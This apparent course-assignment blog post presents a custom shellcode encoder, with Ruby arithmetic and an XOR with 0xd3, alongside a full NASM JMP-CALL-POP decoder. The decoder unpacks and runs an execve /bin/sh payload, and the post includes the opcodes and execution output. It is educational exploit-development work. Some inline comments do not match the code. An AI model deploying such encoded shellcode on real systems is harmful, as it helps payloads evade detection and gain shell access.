---
layout: post
title: SLAE Assignment 4 - Custom Encoder
date: '2016-12-02T20:30:00.000-06:00'
author: Sanjiv Kawa
tags:
- SLAE
- SecurityTube
- Assignment
- Shellcode
- nasm
- assembly
- ruby
- encoder
- decoder
comments: true
---
### SLAE Assignment Stub
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a>

Student ID: SLAE-807


### Assignment 4 Requirements
- Create a custom encoding scheme like the "Insertion Encoder" we showed you.
- PoC with using execve-stack as the shellcode to encode your schema and execute


### The Shellcode
The example shellcode I will be using is a really simple stack-based `execve` SYSCALL that executes `/bin/sh`.

The nasm source is located <a href="https://github.com/skahwah/slae/blob/master/execve-stack/execve-stack.nasm">here</a> and a brief breakdown of the shellcode is located <a href="https://popped.io/execve-stack/">here<a>.


Here are the opcodes:

~~~ bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
~~~


### The Encoder
The encoder is written in Ruby and quite simply takes the user supplied shellcode and:

- Adds 5 to the first 10 bytes
- Subtracts 7 for all remaining bytes
- XOR's all of the arithmetic encoded bytes by `0xd3`

The encoder can be found <a href="https://github.com/skahwah/slae/blob/master/assignment4/encode.rb">here</a>.

~~~ bash
18:32 skawa@skawa-mbp: assignment4 $ ruby encode.rb
[+] C hex format:
"\xe5\x16\x86\xbe\xe7\xe7\xab\xbe\xbe\xe7\x88\xb1\xb4\x51\xf\x9a\x51\x8\x9f\x51\x9\x7a\xd7\x15\xaa";

[+] nasm hex format:
0xe5,0x16,0x86,0xbe,0xe7,0xe7,0xab,0xbe,0xbe,0xe7,0x88,0xb1,0xb4,0x51,0xf,0x9a,0x51,0x8,0x9f,0x51,0x9,0x7a,0xd7,0x15,0xaa

[+] Total length: 25
18:32 skawa@skawa-mbp: assignment4 $
~~~

### The Decoder
The decoder is responsible for decoding the encoded shellcode and passing execution on to the stack-based `execve` `/bin/sh` instructions. It uses the well documented `JMP`, `CALL`, `POP` process.

The decoder can be found <a href="https://github.com/skahwah/slae/blob/master/assignment4/decode.nasm">here</a>.


### Dissecting the Decoder


1\. `jmp short encoded_shellcode`

The first instruction performs a short `jmp` to the `encoded_shellcode` procedure.



<br>2\. `encoded_shellcode:`

The `encoded_shellcode:` procedure initiates a `call` to the `decode` procedure. This will redirect execution to the `decode` procedure and push the address of `EncodedShellcode` on to the Stack.

The `encoded_shellcode:` procedure also has the `EncodedShellcodeLen` label, which contains the length of the shellcode for dynamic allocation to the counter register later in the program.


~~~ nasm
call decode
EncodedShellcode: db 0xe5,0x16,0x86,0xbe,0xe7,0xe7,0xab,0xbe,0xbe,0xe7,0x88,0xb1,0xb4,0x51,0xf,0x9a,0x51,0x8,0x9f,0x51,0x9,0x7a,0xd7,0x15,0xaa
EncodedShellcodeLen equ $-EncodedShellcode
~~~


<br>3\. `decode:`

The `decode:` procedure is responsible for setting up the `ESI` register to point to the beginning of the `EncodedShellcode`.

It also sets up the `EDI` register with an offset of `+10`. The reason for this is add a marker at the 10th byte in `EncodedShellcode` as everything after this is subtracted by 7.

In addition, the length of `EncodedShellcode` is placed into the counter register. This is done by using the address in `ESI` which, points to `EncodedShellcode`, `+8`. As a result, the value in `EncodedShellcodeLen` is stored in `CL`

~~~ nasm
pop esi             ;the address for EncodedShellcode is placed in to ESI
push esi            ;the address for EncodedShellcode is pushed on to the stack for preservation
lea edi, [esi +10]  ;the address for EncodedShellcode with an offset of 10 is placed into EDI

xor ecx, ecx      ;clearing out ecx
mov cl, [esi +8]  ;the length of the EncodedShellcode is placed into DL
~~~


<br>4\. `xor_decoder_loop:`

The `xor_decoder_loop:` procedure is responsible for the first of three decoding processes. On each loop, `EBX` is cleared and the current byte in `EncodedShellcode` which is pointed to by `ESI` is placed into `BL`.

An XOR operation is then conducted against the byte in `BL` and `0xd3`, the result of which is stored in `BL`. The current byte in `EncodedShellcode`, pointed to by `ESI` is then overwritten with the value in `BL`.

`ESI` is then incremented by `1` to shift on to the next byte which needs to be XOR'd. The loop continues until the length of `EncodedShellcode` referred to by `CL` has been met.

~~~ nasm
xor ebx, ebx          ;clearing out ebx
mov bl, byte [esi]    ;taking the current byte in EncodedShellcode and placing it into BL
xor bl, 0xd3          ;xoring the current value in BL with 0xd3 and placing that value into BL
mov byte [esi], bl    ;replacing the current byte at the memory location pointed to by ESI with the decoded byte
inc esi               ;shifting to the next byte
loop xor_decoder_loop ;looping through the entirety of EncodedShellcode
~~~


<br>5\. Setting general purpose registers

Before the `sub_decoder_loop` starts, several instructions need to be updated.

First, `ESI` is reset to the beginning of `EncodedShellcode`, the memory address of this was pushed on to the stack for preservation purposes as described in Step 2.

The counter register is then updated to contain the value `10`. This is so that only the first 10 bytes of `EncodedShellcode` are evaluated in the upcoming loop process.

The length of `EncodedShellcode` is placed into `DL` for preservation purposes. `ESI` will changed as soon as the first loop has been completed, meaning that this needs to be set now. Alternatively, the address could be pushed on to the Stack and then popped off when needed.

The value `5` is then moved into `AL`, this is what will be used as the subtraction value in the upcoming loop.

~~~ nasm
pop esi       ;resetting esi to its original location, the beginning of EncodedShellcode
xor ecx, ecx  ;clearing out ecx
mov cl, 10    ;this sets the loop count for sub_decoder_loop. The fixed value of 10 is okay as only the first 10 bytes need to be subtracted.

xor edx, edx      ;clearing out edx
mov dl, [esi +8]  ;the length of the EncodedShellcode is placed into DL

xor eax, eax  ;clearing out eax
mov al, 5     ;5 is the subtraction value
~~~


<br>6\. `sub_decoder_loop:`

The `sub_decoder_loop:` procedure is responsible for the second of three decoding processes. On each loop, `EBX` is cleared and the current byte in `EncodedShellcode` which is pointed to by `ESI` is placed into `BL`.

A subtraction operation is then conducted against the byte in `BL` and `AL`, the result of which is stored in `BL`. The current byte in `EncodedShellcode`, pointed to by `ESI` is then overwritten with the value in `BL`. This begins to decode the encoded shellcode to its true form.

`ESI` is then incremented by `1` to shift on to the next byte which needs to be subtracted by `5`. The loop continues until the first `10` bytes, as specified by `CL` has been met.

~~~ nasm
xor ebx, ebx          ;clearing out ebx
mov bl, byte [esi]    ;taking the current byte in EncodedShellcode and placing it into BL
sub bl, al            ;subtracting the current value in BL by 5 and placing that value into BL
mov byte [esi], bl    ;replacing the current byte at the memory location pointed to by ESI with the decoded byte
inc esi               ;shifting to the next byte
loop sub_decoder_loop ;loop 10 times
~~~


<br>7\. Setting general purpose registers

Before the `add_decoder_loop` starts, several instructions need to be updated.

First, the counter register is set to the value in `DL`, this contains the value stored in the memory address of `EncodedShellcodeLen`. This was assigned into `DL` for preservation purposes as described in Step 5.

`10` is then subtracted from the length of the shellcode in `DL` as the first `10` bytes have already been decoded.

`2` is then added to the value which is currently in `AL`, this is `7`. As such, `AL` is updated to contain `7`, this is what will be used as the addition value in the upcoming loop.  

~~~ nasm
xor ecx, ecx  ;clearing out ecx
mov cl, dl    ;moving the length of EncodedShellcode into CL
sub cl, 10    ;subtracting the length of EncodedShellcode in CL by 10 as we have already decoded 10 bytes
add al, 2     ;adding 2 to AL. 7 is the addition value.
~~~


<br>8\. `add_decoder_loop:`

The `add_decoder_loop:` procedure is responsible for the last decoding processes. On each loop, `EBX` is cleared and the current byte in `EncodedShellcode` which is pointed to by `EDI` is placed into `BL`.

`EDI` contains the memory address for the 11th byte of the shellcode. As a result, the loop starts from the 11th byte onwards. This is because the first 10 bytes have already been decoded.

A addition operation is then conducted against the byte in `BL` and `AL`, the result of which is stored in `BL`. The current byte in `EncodedShellcode`, pointed to by `EDI` is then overwritten with the value in `BL`. This begins to decode the encoded shellcode, from the 11th byte onwards to its true form.

`EDI` is then incremented by `1` to shift on to the next byte which needs to be added by `7`. The loop continues until the shellcode in it's entirety has been decoded.

~~~ nasm
xor ebx, ebx          ;clearing out ebx
mov bl, byte [edi]    ;taking the current byte in EncodedShellcode and placing it into BL. EDI starts at +10.
add bl, al            ;adding the current value in BL by 7 and placing that value into BL
mov byte [edi], bl    ;replacing the current byte at the memory location pointed to by EDI with the decoded byte
inc edi               ;shifting to the next byte
loop add_decoder_loop ;loop until CL has been met
~~~


<br>9\. `jmp short EncodedShellcode`

The final instruction performs a short `jmp` to the `EncodedShellcode` label where the the existing encoded values have been overwritten with the decoded values. Execution is then passed to the decoded Stack-based `execve` `//bin/sh` shellcode.


### decode.nasm
Below is decode.nasm in its entirety.

~~~ nasm
;decode.nasm
;sanjiv kawa (@skawasec)
;this decodes shellcode encoded by encode.rb

global _start

section .text
_start:
  jmp short encoded_shellcode

decode:
  pop esi             ;the address for EncodedShellcode is placed in to ESI
  push esi            ;the address for EncodedShellcode is pushed on to the stack for preservation
  lea edi, [esi +10]  ;the address for EncodedShellcode with an offset of 10 is placed into EDI

  xor ecx, ecx      ;clearing out ecx
  mov cl, [esi +8]  ;the length of the EncodedShellcode is placed into DL

xor_decoder_loop:
  xor ebx, ebx          ;clearing out ebx
  mov bl, byte [esi]    ;taking the current byte in EncodedShellcode and placing it into BL
  xor bl, 0xd3          ;xoring the current value in BL with 0xd3 and placing that value into BL
  mov byte [esi], bl    ;replacing the current byte at the memory location pointed to by ESI with the decoded byte
  inc esi               ;shifting to the next byte
  loop xor_decoder_loop ;looping through the entirety of EncodedShellcode

  pop esi       ;resetting esi to its original location, the beginning of EncodedShellcode
  xor ecx, ecx  ;clearing out ecx
  mov cl, 10    ;this sets the loop count for sub_decoder_loop. The fixed value of 10 is okay as only the first 10 bytes need to be subtracted.

  xor edx, edx      ;clearing out edx
  mov dl, [esi +8]  ;the length of the EncodedShellcode is placed into DL

  xor eax, eax  ;clearing out eax
  mov al, 5     ;5 is the subtraction value

sub_decoder_loop:
  xor ebx, ebx          ;clearing out ebx
  mov bl, byte [esi]    ;taking the current byte in EncodedShellcode and placing it into BL
  sub bl, al            ;subtracting the current value in BL by 5 and placing that value into BL
  mov byte [esi], bl    ;replacing the current byte at the memory location pointed to by ESI with the decoded byte
  inc esi               ;shifting to the next byte
  loop sub_decoder_loop ;loop 10 times

  xor ecx, ecx  ;clearing out ecx
  mov cl, dl    ;moving the length of EncodedShellcode into CL
  sub cl, 10    ;subtracting the length of EncodedShellcode in CL by 10 as we have already decoded 10 bytes
  add al, 2     ;adding 2 to AL. 7 is the addition value.

add_decoder_loop:
  xor ebx, ebx          ;clearing out ebx
  mov bl, byte [edi]    ;taking the current byte in EncodedShellcode and placing it into BL. EDI starts at +10.
  add bl, al            ;adding the current value in BL by 7 and placing that value into BL
  mov byte [edi], bl    ;replacing the current byte at the memory location pointed to by EDI with the decoded byte
  inc edi               ;shifting to the next byte
  loop add_decoder_loop ;loop until CL has been met

  jmp short EncodedShellcode ;pass execution to the decoded shellcode

encoded_shellcode:
  call decode
  EncodedShellcode: db 0xe5,0x16,0x86,0xbe,0xe7,0xe7,0xab,0xbe,0xbe,0xe7,0x88,0xb1,0xb4,0x51,0xf,0x9a,0x51,0x8,0x9f,0x51,0x9,0x7a,0xd7,0x15,0xaa
  EncodedShellcodeLen equ $-EncodedShellcode
~~~
The decoder can be found <a href="https://github.com/skahwah/slae/blob/master/assignment4/decode.nasm">here</a>.


### Encoding
~~~ bash
20:10 skawa@skawa-mbp: assignment4 $ cat encode.rb | grep x31
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
20:10 skawa@skawa-mbp: assignment4 $ ruby encode.rb
[+] C hex format:
"\xe5\x16\x86\xbe\xe7\xe7\xab\xbe\xbe\xe7\x88\xb1\xb4\x51\xf\x9a\x51\x8\x9f\x51\x9\x7a\xd7\x15\xaa";

[+] nasm hex format:
0xe5,0x16,0x86,0xbe,0xe7,0xe7,0xab,0xbe,0xbe,0xe7,0x88,0xb1,0xb4,0x51,0xf,0x9a,0x51,0x8,0x9f,0x51,0x9,0x7a,0xd7,0x15,0xaa

[+] Total length: 25
20:10 skawa@skawa-mbp: assignment4 $
~~~

The encoder can be found <a href="https://github.com/skahwah/slae/blob/master/assignment4/encode.rb">here</a>.

### Decoding and Execution
I built on top of <a href="https://twitter.com/SecurityTube">Vivek\'s</a> nasm linker and assembler shell script and added the opcode extractor and C compiler used in the SLAE course. You can find `super-compile.sh` <a href="https://github.com/skahwah/slae/blob/master/super-compile.sh">here</a>.

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment4$ ls
decode.nasm  super-compile.sh
skawa@ubuntu:~/Desktop/code/assignment/assignment4$ cat decode.nasm | grep 0xaa
  EncodedShellcode: db 0xe5,0x16,0x86,0xbe,0xe7,0xe7,0xab,0xbe,0xbe,0xe7,0x88,0xb1,0xb4,0x51,0xf,0x9a,0x51,0x8,0x9f,0x51,0x9,0x7a,0xd7,0x15,0xaa
skawa@ubuntu:~/Desktop/code/assignment/assignment4$ ./super-compile.sh decode
[+] Assembling with Nasm
[+] Linking
[+] Extracting Opcodes
[+] Creating Shellcode
[+] Compiling Shellcode
[+] Done!
skawa@ubuntu:~/Desktop/code/assignment/assignment4$ ls
decode  decode.nasm  decode.o  shellcode-decode  shellcode-decode.c  super-compile.sh
skawa@ubuntu:~/Desktop/code/assignment/assignment4$ ./shellcode-decode
Shellcode Length: 62
$ exit
skawa@ubuntu:~/Desktop/code/assignment/assignment4$
~~~
